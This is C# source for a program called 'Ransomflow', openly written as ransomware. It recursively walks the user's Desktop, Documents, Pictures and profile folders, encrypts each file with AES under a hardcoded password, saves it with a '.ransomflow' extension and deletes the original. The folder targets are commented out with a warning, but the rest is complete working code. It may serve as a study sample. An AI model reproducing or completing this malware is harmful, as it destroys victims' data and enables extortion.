using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Threading;

namespace Ransomflow
{
    /// <summary>
    /// This class is responsible to encrypt all the given directories content.
    /// </summary>
    class Ransomflow
    {
        private static List<string> directoriesToEncrypt = new List<string>();
        private static string password = "encryptpassword";

        /// <summary>
        /// Program entry point
        /// </summary>
        static void Main(string[] args)
        {
            // !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
            // BE CAREFULL WHEN REMOVING THESE COMMENTS
            // !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

            //directoriesToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
            //directoriesToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
            //directoriesToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
            //directoriesToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));

            Encrypt();
        }

        /// <summary>
        /// Function responsible to go through all the directories that are supposed to be encrypted
        /// </summary>
        private static void Encrypt()
        {
            foreach(string path in directoriesToEncrypt)
            {
                new Thread(() => ProcessDirectory(path)).Start();
            }
        }

        /// <summary>
        /// Recursive function that allows the program to go through all the files of a directory even if they are inside a sub-directory
        /// More info: https://stackoverflow.com/a/5181424/4466024
        /// </summary>
        private static void ProcessDirectory(string targetDirectory)
        {
            try
            {
                string[] fileEntries = Directory.GetFiles(targetDirectory);
                foreach (string fileName in fileEntries)
                {
                    ProcessFile(fileName);
                }

                string[] subdirectoryEntries = Directory.GetDirectories(targetDirectory);
                foreach (string subdirectory in subdirectoryEntries)
                {
                    ProcessDirectory(subdirectory);
                }
            }
            catch { }
        }

        /// <summary>
        /// Generates a random array of bytes which will be used to encrypt the files
        /// </summary>
        public static byte[] GenerateRandomSalt()
        {
            byte[] data = new byte[32];

            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                for (int i = 0; i < 10; i++)
                {
                    rng.GetBytes(data);
                }
            }

            return data;
        }

        /// <summary>
        /// Encrypts a file using the AES standard with a password
        /// More info: https://ourcodeworld.com/articles/read/471/how-to-encrypt-and-decrypt-files-using-the-aes-encryption-algorithm-in-c-sharp
        /// </summary>
        private static void FileEncrypt(string inputFile, string password)
        {
            byte[] salt = GenerateRandomSalt();

            FileStream fsCrypt = new FileStream(inputFile + ".ransomflow", FileMode.Create);

            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);

            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            AES.Padding = PaddingMode.PKCS7;

            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);
            AES.Mode = CipherMode.CFB;

            fsCrypt.Write(salt, 0, salt.Length);

            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write);
            FileStream fsIn = new FileStream(inputFile, FileMode.Open);

            byte[] buffer = new byte[1048576];
            int read;

            try
            {
                while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
                {
                    cs.Write(buffer, 0, read);
                }

                fsIn.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
            finally
            {
                cs.Close();
                fsCrypt.Close();
            }
        }

        /// <summary>
        /// Function that will encrypt a file and then delete the original
        /// </summary>
        private static void ProcessFile(string path)
        {
            if (path.Contains(".ransomflow"))
            {
                return;
            }

            try
            {
                FileEncrypt(path, password);
                File.Delete(path);
            }
            catch { }
        }
    }
}
